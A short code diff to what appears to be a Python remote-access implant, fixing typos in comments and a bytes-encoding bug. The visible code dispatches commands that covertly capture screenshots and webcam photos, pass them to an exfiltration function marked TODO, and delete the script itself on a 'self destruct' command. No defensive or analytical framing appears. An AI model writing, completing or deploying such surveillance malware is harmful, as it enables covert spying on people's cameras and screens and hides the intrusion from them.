@@ -77,7 +77,7 @@ def execcmd(cmd: list[str]):
         get(cp)
     elif ct == "sc": # exfiltrate screenshot
         sc()
-    elif ct == "cam": # exfiltrate webcame photo
+    elif ct == "cam": # exfiltrate webcam photo
         cam()
     elif ct == "sd": # self destruct
         sd()
@@ -128,7 +128,7 @@ def sc():
 
 def cam():
     """
-    Exfiltrates webcame photo
+    Exfiltrates webcam photo
     """
     vid = cv2.VideoCapture(0) # begin video recording through webcam
     exfil(cv2.imencode('.jpg', vid.read()[1])[1].tobytes()) # exfiltrate still frame
@@ -138,7 +138,7 @@ def sd():
     """
     Exfiltrates self destruct status and then deletes this file
     """
-    exfil("self destruct") # exfiltrate self destruct status
+    exfil("self destruct".encode()) # exfiltrate self destruct status
     subprocess.run(["rm", __file__])
 
 def exfil(info: bytes): # TODO
